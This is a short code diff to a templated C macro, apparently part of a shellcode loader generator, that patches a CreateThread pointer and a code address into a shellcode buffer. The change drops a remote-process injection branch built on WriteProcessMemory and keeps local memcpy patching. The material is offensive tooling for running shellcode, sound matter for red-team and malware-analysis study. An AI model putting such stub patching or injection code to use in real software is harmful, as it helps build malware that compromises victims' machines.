@@ -121,7 +121,7 @@
     {% endif %}
 {% endmacro %}
 
-{% macro createThreadStub(type, shellCodeAddr, remoteCode) %}
+{% macro createThreadStub(shellCodeAddr, remoteCode) %}
 {% if stub and stub.yaml_tag == "!modifier.CreateThreadStub" %}
     {{ function_definition("CreateThread") }}
 
@@ -129,13 +129,8 @@
     void *createThreadOffset = (void*)((unsigned char *){{ shellCodeAddr }} + {{ stub.createThreadOffset() }});
     void *remoteCodeAddr = (void*)((unsigned char *){{ remoteCode }} + {{ stub.offset() + stub.length() }});
 
-    {% if type == "local" %}
-        memcpy(remoteCodeOffset, &remoteCodeAddr, 8);
-        memcpy(createThreadOffset, &pCreateThread, 8);
-    {% elif type == "remote" %}
-        pWriteProcessMemory(hProc, remoteCodeOffset, &remoteCodeAddr, 8, NULL);
-        pWriteProcessMemory(hProc, createThreadOffset, &pCreateThread, 8, NULL);
-    {% endif %}
+    memcpy(remoteCodeOffset, &remoteCodeAddr, 8);
+    memcpy(createThreadOffset, &pCreateThread, 8);
 {% endif %}
 {% endmacro %}
 
